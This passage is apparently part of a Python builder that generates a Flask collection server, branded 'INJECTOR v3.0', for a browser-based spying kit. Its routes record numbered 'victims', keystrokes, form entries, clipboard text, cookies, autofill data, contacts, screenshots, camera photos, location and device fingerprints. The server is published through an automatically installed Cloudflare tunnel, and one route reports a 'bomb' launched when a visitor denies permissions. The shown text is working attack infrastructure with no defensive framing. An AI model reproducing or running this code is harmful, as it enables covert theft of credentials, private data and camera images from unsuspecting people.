    \'keylogs\':     \'captures/keylogs\',
    \'screencaps\':  \'captures/screencaps\',
    \'misc\':        \'captures/misc\',
}
for _d in CAP.values(): os.makedirs(_d, exist_ok=True)

PRI = "__PRI__"
SEC = "__SEC__"
ACC = "__ACC__"
WH  = "\\033[1;97m"
DM  = "\\033[0;37m"
RD  = "\\033[1;91m"
GR  = "\\033[1;92m"
YL  = "\\033[1;93m"
CY  = "\\033[1;96m"
MG  = "\\033[1;95m"
RS  = "\\033[0m"
BD  = "\\033[1m"
BC  = "__BC__"
SC  = "__SC__"

victims  = [0]
_seen    = set()

def _ts():  return time.strftime(\'%H:%M:%S\')
def _w():   return max(70, min(120, shutil.get_terminal_size(fallback=(90,24)).columns-4))
def _al(s): return len(re.sub(r\'\\033\\[[0-9;]*m\',\'\',s))

def _top(): print(SEC+\'  \'+BC+SC*_w()+BC+RS)
def _bot(): print(SEC+\'  \'+BC+SC*_w()+BC+RS)

def _sep(lb=\'\'):
    w=_w()
    if lb:
        tag=\' \'+lb+\' \'; pad=SC*((w-len(tag))//2)
        print(SEC+\'  \'+pad+ACC+tag+SEC+pad+SC+RS)
    else:
        print(SEC+\'  \'+SC*w+RS)

def _row(label, val, col=\'\'):
    w=_w(); c=col or WH
    v=str(val)[:w-20]
    inn=\'  \'+DM+label[:12].ljust(12)+\' \'+SEC+\'│\'+RS+\'  \'+c+v+RS
    pad=w-_al(inn)+2
    print(SEC+\'  │\'+inn+\' \'*max(0,pad)+SEC+\'│\'+RS)

def _title(txt, col=\'\'):
    w=_w(); c=col or PRI
    inn=\'  \'+c+BD+txt+RS
    pad=w-_al(inn)+2
    print(SEC+\'  │\'+inn+\' \'*max(0,pad)+SEC+\'│\'+RS)

def arch():
    m=platform.machine().lower()
    if \'aarch64\' in m or \'arm64\' in m: return \'aarch64\'
    return \'amd64\'

def _install_cf():
    a=arch()
    urls={\'aarch64\':\'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\',
          \'amd64\'  :\'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\'}
    try:
        subprocess.run([\'wget\',\'-q\',\'-O\',\'/tmp/cf\',urls[a]],check=True)
        subprocess.run([\'chmod\',\'+x\',\'/tmp/cf\'],check=True)
        subprocess.run([\'sudo\',\'mv\',\'/tmp/cf\',\'/usr/local/bin/cloudflared\'],check=True)
        return True
    except: return False

def _cf():
    return subprocess.run([\'which\',\'cloudflared\'],capture_output=True).returncode==0 or _install_cf()

def start_tunnel():
    if not _cf(): return
    try:
        p=subprocess.Popen([\'cloudflared\',\'tunnel\',\'--url\',\'http://localhost:5000\'],
                           stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        for line in p.stderr:
            dc=line.decode(\'utf-8\',errors=\'ignore\')
            m=re.search(r\'https://[a-z0-9\\-]+\\.trycloudflare\\.com\',dc)
            if m:
                url=m.group(0); print()
                _top()
                _title(\'  TUNNEL ACTIVE\', GR)
                _sep()
                _row(\'PUBLIC URL\', url, CY)
                _row(\'PROJECT\',   \'__PROJECT__\', ACC)
                _bot(); print(); break
    except: pass

def radar(i):
    fr=[[\'  . . . . .\',\'  . . | . .\',\'  . - + - .\',\'  . . | . .\',\'  . . . . .\'],[\'  . . . . .\',\'  . . / . .\',\'  . . + . .\',\'  . . . \\\\\\\\ .\',\'  . . . . .\'],[\'  . . . . .\',\'  . . . . .\',\'  . - + - .\',\'  . . . . .\',\'  . . . . .\'],[\'  . . . . .\',\'  . \\\\\\\\ . . .\',\'  . . + . .\',\'  . . . / .\',\'  . . . . .\']]
    for ln in fr[i%4]: print(\'  \'+PRI+ln+RS)

def boot():
    import random
    steps=[\'LOADING __PROJECT__\',\'INITIALIZING CAPTURES\',\'FLASK SETUP\',\'CLOUDFLARED CHECK\',\'READY\']
    for i,s in enumerate(steps):
        os.system(\'clear\'); print(); radar(i)
        print(\'\\n  \'+PRI+BD+\'◆ __PROJECT_UPPER__ ◆\'+RS+\'\\n\')
        for j,st in enumerate(steps):
            if   j<i:  print(\'  \'+DM+\'[\'+PRI+\'+\'+DM+\']\'+RS+\' \'+DM+st.ljust(32)+PRI+\' OK\'+RS)
            elif j==i: print(\'  \'+DM+\'[\'+YL+\'>\'+DM+\']\'+RS+\' \'+WH+st.ljust(32)+YL+\' ...\'+RS)
            else:      print(\'  \'+DM+\'[ ] \'+st+RS)
        time.sleep(random.uniform(0.05,0.12))
    time.sleep(0.25); os.system(\'clear\')

def banner():
    print(); _top()
    _title(\'__PROJECT_UPPER__  │  __THEME__  │  INJECTOR v3.0\')
    _sep()
    _row(\'FEATURES\', \'__FEATURES__\', WH)
    _row(\'ARCH\',     arch().upper(), DM)
    _row(\'STATUS\',   \'LISTENING\',    GR)
    _bot(); print()

@app.after_request
def cors(r):
    r.headers[\'Access-Control-Allow-Origin\']  = \'*\'
    r.headers[\'Access-Control-Allow-Headers\'] = \'Content-Type\'
    r.headers[\'Access-Control-Allow-Methods\'] = \'GET,POST,OPTIONS\'
    return r

@app.route(\'/\')
def index(): return render_template(\'__HTML__.html\')

# ══════════════════════════════════════════════════════════════
# HIGH-VALUE ROUTES
# ══════════════════════════════════════════════════════════════

@app.route(\'/collect\', methods=[\'POST\',\'OPTIONS\'])
def collect():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        dev=d.get(\'device\',{}); ip=request.remote_addr
        first=ip not in _seen
        if first:
            _seen.add(ip); victims[0]+=1
            print()
            _top()
            _title(f\'  VICTIM #{victims[0]}  ─  {_ts()}\', PRI)
            _sep(\'NETWORK\')
            _row(\'PUBLIC IP\',  dev.get(\'ip\',ip),           CY)
            _row(\'REMOTE IP\',  ip,                          DM)
            _row(\'REFERRER\',   dev.get(\'referrer\',\'direct\'), DM)
            _sep(\'DEVICE\')
            _row(\'PLATFORM\',   dev.get(\'platform\',\'?\'),     WH)
            _row(\'SCREEN\',     dev.get(\'screen\',\'?\'),       WH)
            _row(\'WINDOW\',     dev.get(\'win\',\'?\'),          WH)
            _row(\'CPU CORES\',  str(dev.get(\'cores\',\'?\')),   WH)
            _row(\'RAM\',        str(dev.get(\'mem\',\'?\')),     WH)
            _row(\'GPU\',        dev.get(\'gpu\',\'?\'),          ACC)
            _row(\'TIMEZONE\',   dev.get(\'tz\',\'?\'),           WH)
            _row(\'LANGUAGE\',   dev.get(\'language\',\'?\'),     WH)
            _row(\'TOUCH PTS\',  str(dev.get(\'touch\',\'?\')),   WH)
            _sep(\'FINGERPRINT\')
            _row(\'CANVAS FP\',  dev.get(\'canvasFP\',\'?\'),     DM)
            _row(\'AUDIO FP\',   dev.get(\'audioFP\',\'N/A\'),    DM)
            bat=dev.get(\'battery\',{})
            if bat: _row(\'BATTERY\', f\'{bat.get("level","?")}  charging={bat.get("charging","?")}\', GR)
            net=dev.get(\'net\',{})
            if net: _row(\'CONNECTION\', f\'{net.get("type","?")}  {net.get("dl","?")}Mbps  rtt={net.get("rtt","?")}ms\', WH)
            fonts=dev.get(\'fonts\',\'\')
            if fonts: _row(\'FONTS\', fonts[:70], DM)
            _row(\'ADBLOCK\',    str(dev.get(\'adBlock\',\'?\')),  YL)
            _bot(); print()
        else:
            print(f\'  {DM}[{_ts()}]{RS} {SEC}[{PRI}*{SEC}]{RS} {DM}Repeat hit from{RS} {CY}{ip}{RS}\')
        fn=os.path.join(CAP[\'logs\'],f\'victim_{datetime.now().strftime("%Y%m%d_%H%M%S")}_{victims[0]}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except Exception as e:
        return jsonify({\'status\':\'error\'}),500

@app.route(\'/rtc\', methods=[\'POST\',\'OPTIONS\'])
def rtc():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        ips=d.get(\'localIPs\',[])
        if not ips: return jsonify({\'status\':\'ok\'})
        print()
        _top()
        _title(f\'  WEBRTC LEAK  ─  {_ts()}\', CY)
        _sep()
        for ip in ips: _row(\'LOCAL IP\', ip, CY)
        _row(\'REMOTE IP\', request.remote_addr, DM)
        _bot(); print()
        fn=os.path.join(CAP[\'misc\'],f\'rtc_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/keylog\', methods=[\'POST\',\'OPTIONS\'])
def keylog():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        keys=d.get(\'keys\',[])
        if not keys: return jsonify({\'status\':\'ok\'})
        typed=\'\'.join([k.get(\'k\',\'\') for k in keys])
        fields=list(set([k.get(\'el\',\'\') for k in keys if k.get(\'el\',\'\')]))
        print()
        _top()
        _title(f\'  KEYLOG  ─  {_ts()}\', YL)
        _sep()
        _row(\'TYPED\',   typed[:80],           ACC)
        _row(\'FIELDS\',  \', \'.join(fields),    DM)
        _row(\'FROM IP\', request.remote_addr,  DM)
        _bot(); print()
        fn=os.path.join(CAP[\'keylogs\'],f\'key_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt\')
        with open(fn,\'a\') as f: f.write(f\'[{d.get("ts","?")}] {typed}\\n\')
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/form\', methods=[\'POST\',\'OPTIONS\'])
def form():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        fd=d.get(\'form\',{})
        if not fd: return jsonify({\'status\':\'ok\'})
        print()
        _top()
        _title(f\'  FORM INPUT  ─  {_ts()}\', GR)
        _sep()
        for k,v in fd.items():
            if str(v).strip(): _row(str(k)[:12], str(v)[:80], GR)
        _row(\'FROM IP\', request.remote_addr, DM)
        _bot(); print()
        fn=os.path.join(CAP[\'logs\'],f\'form_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/clip\', methods=[\'POST\',\'OPTIONS\'])
def clip():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        t=str(d.get(\'data\',\'\')).strip()
        if not t: return jsonify({\'status\':\'ok\'})
        print()
        _top()
        _title(f\'  CLIPBOARD {d.get("ev","?").upper()}  ─  {_ts()}\', MG)
        _sep()
        _row(\'DATA\',    t[:100],              ACC)
        _row(\'FROM IP\', request.remote_addr,  DM)
        _bot(); print()
        fn=os.path.join(CAP[\'keylogs\'],f\'clip_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt\')
        with open(fn,\'w\') as f: f.write(t)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/select\', methods=[\'POST\',\'OPTIONS\'])
def select():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        sels=[s.get(\'txt\',\'\').strip() for s in d.get(\'selections\',[]) if s.get(\'txt\',\'\').strip()]
        if not sels: return jsonify({\'status\':\'ok\'})
        print()
        _top()
        _title(f\'  TEXT SELECTED  ─  {_ts()}\', YL)
        _sep()
        for s in sels[:4]: _row(\'SELECTED\', s[:80], YL)
        _row(\'FROM IP\', request.remote_addr, DM)
        _bot(); print()
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/storage\', methods=[\'POST\',\'OPTIONS\'])
def storage():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        t=d.get(\'type\',\'?\'); data=d.get(\'data\',d.get(\'dbs\',[]))
        if not data: return jsonify({\'status\':\'ok\'})
        print()
        _top()
        _title(f\'  STORAGE [{t}]  ─  {_ts()}\', CY)
        _sep()
        if isinstance(data,dict):
            for k,v in list(data.items())[:8]: _row(str(k)[:12], str(v)[:80], GR)
        else:
            for db in data[:6]: _row(\'DB\', str(db), GR)
        _row(\'FROM IP\', request.remote_addr, DM)
        _bot(); print()
        fn=os.path.join(CAP[\'misc\'],f\'storage_{t}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/devtools\', methods=[\'POST\',\'OPTIONS\'])
def devtools():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        if not d.get(\'open\'): return jsonify({\'status\':\'ok\'})
        print()
        _top()
        _title(f\'  ⚠  DEVTOOLS OPENED  ─  {_ts()}\', RD)
        _sep()
        _row(\'FROM IP\', request.remote_addr, RD)
        _bot(); print()
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/mediadevs\', methods=[\'POST\',\'OPTIONS\'])
def mediadevs():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        devs=d.get(\'devices\',[])
        if not devs: return jsonify({\'status\':\'ok\'})
        print()
        _top()
        _title(f\'  MEDIA DEVICES  ─  {_ts()}\', CY)
        _sep()
        for dev in devs[:6]: _row(dev.get(\'kind\',\'?\')[:12], dev.get(\'label\',\'[hidden]\'), CY)
        _row(\'FROM IP\', request.remote_addr, DM)
        _bot(); print()
        fn=os.path.join(CAP[\'misc\'],f\'mediadevs_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/deny\', methods=[\'POST\',\'OPTIONS\'])
def deny():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        print()
        _top()
        _title(f\'  ☠  PERM DENIED → BOMB LAUNCHED  ─  {_ts()}\', RD)
        _sep()
        _row(\'FROM IP\', request.remote_addr, RD)
        _bot(); print()
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/notify\', methods=[\'POST\',\'OPTIONS\'])
def notify():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        s=d.get(\'status\',\'?\'); c=GR if s==\'granted\' else RD
        print(f\'  {DM}[{_ts()}]{RS} {SEC}[{c}NOTIFY{SEC}]{RS} {c}{s.upper()}{RS}  {DM}{request.remote_addr}{RS}\')
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/screencap\', methods=[\'POST\',\'OPTIONS\'])
def screencap():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        print()
        _top()
        _title(f\'  SCREEN CAPTURE STARTED  ─  {_ts()}\', MG)
        _sep()
        _row(\'TRACK\',   d.get(\'label\',\'?\'), ACC)
        _row(\'FROM IP\', request.remote_addr, DM)
        _bot(); print()
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/screencap_frame\', methods=[\'POST\',\'OPTIONS\'])
def screencap_frame():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        if \'frame\' not in request.files: return jsonify({\'status\':\'error\'}),400
        f=request.files[\'frame\']
        fn=os.path.join(CAP[\'screencaps\'],f\'scap_{datetime.now().strftime("%Y%m%d_%H%M%S_%f")}.jpg\')
        f.save(fn)
        sz=os.path.getsize(fn)
        print(f\'  {DM}[{_ts()}]{RS} {SEC}[{MG}SCAP{SEC}]{RS} {MG}Frame {sz}B{RS}\')
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/ss\', methods=[\'POST\',\'OPTIONS\'])
def ss():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        if \'ss\' not in request.files: return jsonify({\'status\':\'error\'}),400
        f=request.files[\'ss\']
        fn=os.path.join(CAP[\'screenshots\'],f\'ss_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png\')
        f.save(fn)
        sz=os.path.getsize(fn)
        print(f\'  {DM}[{_ts()}]{RS} {SEC}[{CY}SS{SEC}]{RS} {DM}{sz}B{RS}\')
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/midi\', methods=[\'POST\',\'OPTIONS\'])
def midi():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        devs=d.get(\'devices\',[])
        if not devs: return jsonify({\'status\':\'ok\'})
        print()
        _top()
        _title(f\'  MIDI DEVICES  ─  {_ts()}\', CY)
        _sep()
        for dev in devs[:6]: _row(dev.get(\'type\',\'?\')[:12], dev.get(\'name\',\'?\'), CY)
        _row(\'FROM IP\', request.remote_addr, DM)
        _bot(); print()
        fn=os.path.join(CAP[\'misc\'],f\'midi_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/bluetooth\', methods=[\'POST\',\'OPTIONS\'])
def bluetooth():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        print()
        _top()
        _title(f\'  BLUETOOTH  ─  {_ts()}\', CY)
        _sep()
        _row(\'NAME\',    d.get(\'name\',\'?\'),     ACC)
        _row(\'ID\',      d.get(\'id\',\'?\')[:20], DM)
        _row(\'FROM IP\', request.remote_addr,   DM)
        _bot(); print()
        fn=os.path.join(CAP[\'misc\'],f\'bt_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/usb\', methods=[\'POST\',\'OPTIONS\'])
def usb():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        print()
        _top()
        _title(f\'  USB DEVICES  ─  {_ts()}\', CY)
        _sep()
        for dev in d.get(\'devices\',[d])[:6]:
            if isinstance(dev,dict): _row(dev.get(\'name\',\'?\')[:12], f\'vendor={dev.get("vendor","?")}\', CY)
        _row(\'FROM IP\', request.remote_addr, DM)
        _bot(); print()
        fn=os.path.join(CAP[\'misc\'],f\'usb_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/afp\', methods=[\'POST\',\'OPTIONS\'])
def afp():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        fp=d.get(\'audioFP\',\'\')
        if fp: print(f\'  {DM}[{_ts()}]{RS} {SEC}[{ACC}AFP{SEC}]{RS} {ACC}{fp}{RS}  {DM}{request.remote_addr}{RS}\')
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

# ── NEW HIGH-VALUE ROUTES ─────────────────────────────────────

@app.route(\'/battery\', methods=[\'POST\',\'OPTIONS\'])
def battery():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        ev=d.get(\'event\',\'?\')
        if ev==\'poll\': return jsonify({\'status\':\'ok\'})  # silent poll
        print()
        _top()
        _title(f\'  BATTERY {ev.upper()}  ─  {_ts()}\', YL)
        _sep()
        _row(\'LEVEL\',    str(d.get(\'level\',\'?\')),             GR)
        _row(\'CHARGING\', str(d.get(\'charging\',\'?\')),          YL)
        _row(\'DROP\',     str(d.get(\'drop\',0))+\'%\',           RD if d.get(\'drop\',0)>5 else DM)
        _row(\'FROM IP\',  request.remote_addr,                 DM)
        _bot(); print()
        fn=os.path.join(CAP[\'misc\'],f\'battery_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/ssid\', methods=[\'POST\',\'OPTIONS\'])
def ssid():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        print()
        _top()
        _title(f\'  NETWORK INFO  ─  {_ts()}\', CY)
        _sep()
        _row(\'TYPE\',       d.get(\'type\',\'?\'),          WH)
        _row(\'EFF TYPE\',   d.get(\'effectiveType\',\'?\'), ACC)
        _row(\'DOWNLINK\',   str(d.get(\'downlink\',\'?\'))+\'Mbps\', WH)
        _row(\'RTT\',        str(d.get(\'rtt\',\'?\'))+\'ms\', WH)
        _row(\'FROM IP\',    request.remote_addr,          DM)
        _bot(); print()
        fn=os.path.join(CAP[\'misc\'],f\'ssid_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/accel\', methods=[\'POST\',\'OPTIONS\'])
def accel():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        if \'orientation\' in d:
            o=d[\'orientation\']
            print(f\'  {DM}[{_ts()}]{RS} {SEC}[{ACC}ORIENT{SEC}]{RS} {WH}α={o.get("alpha","?")} β={o.get("beta","?")} γ={o.get("gamma","?")}{RS}\')
        elif \'samples\' in d:
            s=d[\'samples\']; last=s[-1] if s else {}
            print(f\'  {DM}[{_ts()}]{RS} {SEC}[{ACC}ACCEL{SEC}]{RS} {WH}x={last.get("ax","?")} y={last.get("ay","?")} z={last.get("az","?")}{RS}\')
        fn=os.path.join(CAP[\'misc\'],f\'accel_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/ipgeo\', methods=[\'POST\',\'OPTIONS\'])
def ipgeo():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        print()
        _top()
        _title(f\'  IP GEOLOCATION  ─  {_ts()}\', GR)
        _sep()
        _row(\'IP\',      d.get(\'ip\',\'?\'),      CY)
        _row(\'CITY\',    d.get(\'city\',\'?\'),     WH)
        _row(\'REGION\',  d.get(\'region\',\'?\'),   WH)
        _row(\'COUNTRY\', d.get(\'country\',\'?\'),  WH)
        _row(\'ORG\',     d.get(\'org\',\'?\'),      DM)
        _row(\'TIMEZONE\',d.get(\'timezone\',\'?\'), DM)
        if d.get(\'lat\'): _row(\'MAPS\', f\'https://maps.google.com/?q={d["lat"]},{d["lon"]}\', GR)
        _row(\'FROM IP\', request.remote_addr,   DM)
        _bot(); print()
        fn=os.path.join(CAP[\'logs\'],f\'ipgeo_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/cookies\', methods=[\'POST\',\'OPTIONS\'])
def cookies():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        ck=d.get(\'cookies\',\'\')
        if not ck: return jsonify({\'status\':\'ok\'})
        print()
        _top()
        _title(f\'  COOKIES  ─  {_ts()}\', MG)
        _sep()
        for pair in ck.split(\';\')[:8]:
            pair=pair.strip()
            if \'=\' in pair:
                k,v=pair.split(\'=\',1)
                _row(k.strip()[:12], v.strip()[:80], ACC)
        _row(\'FROM IP\', request.remote_addr, DM)
        _bot(); print()
        fn=os.path.join(CAP[\'misc\'],f\'cookies_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt\')
        with open(fn,\'w\') as f: f.write(ck)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/autofill\', methods=[\'POST\',\'OPTIONS\'])
def autofill():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        data=d.get(\'data\',{})
        if not data: return jsonify({\'status\':\'ok\'})
        print()
        _top()
        _title(f\'  AUTOFILL GRABBED  ─  {_ts()}\', GR)
        _sep()
        for k,v in data.items():
            if v: _row(str(k)[:12], str(v)[:80], GR)
        _row(\'FROM IP\', request.remote_addr, DM)
        _bot(); print()
        fn=os.path.join(CAP[\'keylogs\'],f\'autofill_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/contacts\', methods=[\'POST\',\'OPTIONS\'])
def contacts():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        cts=d.get(\'contacts\',[])
        if not cts: return jsonify({\'status\':\'ok\'})
        print()
        _top()
        _title(f\'  CONTACTS  ─  {_ts()}  ({len(cts)} entries)\', GR)
        _sep()
        for c in cts[:6]:
            name=\' \'.join(c.get(\'name\',[]) or [\'\'])
            tel=\' \'.join(c.get(\'tel\',[]) or [\'\'])
            email=\' \'.join(c.get(\'email\',[]) or [\'\'])
            _row(name[:12], f\'{tel}  {email}\', WH)
        _row(\'FROM IP\', request.remote_addr, DM)
        _bot(); print()
        fn=os.path.join(CAP[\'misc\'],f\'contacts_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/charging\', methods=[\'POST\',\'OPTIONS\'])
def charging():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        state=\'CHARGING\' if d.get(\'charging\') else \'UNPLUGGED\'
        c=GR if d.get(\'charging\') else YL
        print(f\'  {DM}[{_ts()}]{RS} {SEC}[{c}CHARGE{SEC}]{RS} {c}{state}{RS}  {WH}{d.get("level","?")}%{RS}  {DM}{request.remote_addr}{RS}\')
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

@app.route(\'/beacon\', methods=[\'POST\',\'OPTIONS\'])
def beacon():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        d=request.get_json(force=True,silent=True) or {}
        print(f\'  {DM}[{_ts()}]{RS} {SEC}[{YL}BEACON{SEC}]{RS} {YL}Page closed{RS}  {DM}{request.remote_addr}{RS}\')
        fn=os.path.join(CAP[\'misc\'],f\'beacon_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
        with open(fn,\'w\') as f: json.dump(d,f,indent=2)
        return jsonify({\'status\':\'ok\'})
    except: return jsonify({\'status\':\'error\'}),500

# ══════════════════════════════════════════════════════════════
# SILENT ROUTES — save only, zero terminal output
# ══════════════════════════════════════════════════════════════

def _save(folder, prefix, data):
    fn=os.path.join(CAP[folder],f\'{prefix}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json\')
    try:
        with open(fn,\'w\') as f: json.dump(data,f,indent=2)
    except: pass

def _silent(route_fn):
    def wrapper():
        if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
        return jsonify({\'status\':\'ok\'})
    wrapper.__name__=route_fn
    return wrapper

for _r in [\'scroll\',\'zoom\',\'idle\',\'vis\',\'netchange\',\'perf\',\'mine\',\'referrer\',
           \'heat\',\'plugins\',\'voices\',\'ws\',\'wsocket\',\'vibrate\',\'wakelock\',
           \'titlespoof\',\'magneto\',\'proximity\',\'pressure\',\'orient\',\'tzfp\',
           \'carrier\',\'vpn\',\'tor\',\'histtime\',\'idbscan\',\'cachetiming\',\'sw\',
           \'keystroke\',\'touchfp\',\'scrollpat\',\'dnsexfil\',\'antiss\',\'anticlose\']:
    app.route(\'/\'+_r, methods=[\'POST\',\'OPTIONS\',\'GET\'])(_silent(_r))

__EXTRA_ROUTES__

if __name__ == \'__main__\':
    boot(); banner()
    threading.Thread(target=start_tunnel,daemon=True).start()
    time.sleep(0.4); print()
    app.run(host=\'0.0.0.0\',port=5000,debug=False,use_reloader=False)
'''

ROUTE_PHOTO = '''
@app.route(\'/photo\', methods=[\'POST\',\'OPTIONS\'])
def photo():
    if request.method==\'OPTIONS\': return jsonify({\'status\':\'ok\'})
    try:
        if \'photo\' not in request.files: return jsonify({\'status\':\'error\'}),400
        f=request.files[\'photo\']; fn_orig=f.filename or \'photo\'
        cam=\'FRONT\' if \'front\' in fn_orig else (\'REAR\' if \'rear\' in fn_orig else \'CAM\')
        fn=os.path.join(CAP[\'photos\'],f\'{fn_orig.split("_")[0]}_{datetime.now().strftime("%Y%m%d_%H%M%S_%f")}.jpg\')
        f.save(fn); sz=os.path.getsize(fn)
        c=CY if cam==\'FRONT\' else GR
